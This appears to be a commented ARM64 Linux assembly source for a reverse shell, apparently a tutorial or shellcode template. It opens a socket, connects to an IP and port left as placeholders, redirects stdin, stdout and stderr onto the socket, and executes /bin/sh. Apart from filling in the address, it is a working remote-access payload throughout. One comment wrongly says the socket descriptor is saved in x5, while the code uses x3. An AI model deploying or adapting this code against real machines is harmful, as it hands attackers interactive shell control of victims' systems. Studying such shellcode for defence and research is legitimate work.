/* Defining syscalls */
.equ SYS_SOCKET, 198
.equ SYS_CONNECT, 203
.equ SYS_DUPTHREE, 24
.equ SYS_EXECVE, 221
.equ SYS_EXIT, 93

/* Terminal to be used by execve() */
.section .rodata
shell:
  .asciz "/bin/sh"

.section .text
.global _start
_start:

/* Calling socket(AF_INET, SOCK_STREAM, 0) as syscall. x0 holds communication domain, which is AF_INET (IPv4 i.e. 2) in this case, followed by x1 holding socket type, which is sequenced connection-based byte stream (SOCK_STREAM i.e. 1) and lastly x2 denotes particular protocol, which is 0 for single protocol family. This concludes with a 'svc' call to invoke SOCKET SYSCALL. Once it's done, it will return a socket file descriptor in x0, which we'll also save in x5*/
  mov x8, SYS_SOCKET
  mov x0, #2
  mov x1, #1
  mov x2, #0
  svc 0
  mov x3, x0

/* Calling connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) */
  mov x8, SYS_CONNECT

/* sockfd */
  mov x0, x3

/* Setting (struct sockaddr *)&addr */

  /* addr.sin_family = AF_INET (i.e. 2) */
  mov w4, 0x0002
  str w4, [sp]

  /* addr.sin_port = htons(PORT); (i.e. 4444, or 0x5c11) */
  /* This needs to be in little endian format, e.g. 0x5c11 becomes 0x115c */
  mov w5, <PORT>
  str w5, [sp, 2]

  /* inet_aton(ip, &addr.sin_addr); (i.e. "127.0.0.1", or 0x7f000001) */
  /* Divide it into two parts and make them little-endian */
  /* For e.g. - 0x7f000001's Part I is 0x7f00, and when converted to little-endian, becomes 0x007f */
  /* For e.g. - 0x7f000001's Part II is 0x0001, and when converted to little-endian, becomes 0x0100 */
  mov w6, <IPV4-PART1>
  str w6, [sp, 4]
  mov w7, <IPV4-PART2>
  str w7, [sp, 6]

  /* Moving (struct sockaddr *)&addr to x1 */
  mov x1, sp

  /* sizeof(addr) */
  mov x2, #16
  svc 0

/* Duplicating STDIN, STDOUT, STDERR over network socket using dup3 syscall so that all shell input/output can be relayed over network */
  mov x8, SYS_DUPTHREE
  mov x0, x3
  mov x1, #0
  mov x2, #0
  svc 0

  mov x8, SYS_DUPTHREE
  mov x0, x3
  mov x1, #1
  mov x2, #0
  svc 0

  mov x8, SYS_DUPTHREE
  mov x0, x3
  mov x1, #2
  mov x2, #0
  svc 0

/* Calling execve('/bin/sh', NULL, NULL) */
  mov x8, SYS_EXECVE
  ldr x0, =shell
  mov x1, #0
  mov x2, #0
  svc 0

/* Copies EXIT syscall value to the special register 'x8' register, followed by copying the exit code 0 to 'x0' register, and finally calling 'svc' instruction to invoke EXIT SYSCALL. */
  mov x8, SYS_EXIT
  mov x0, #0
  svc 0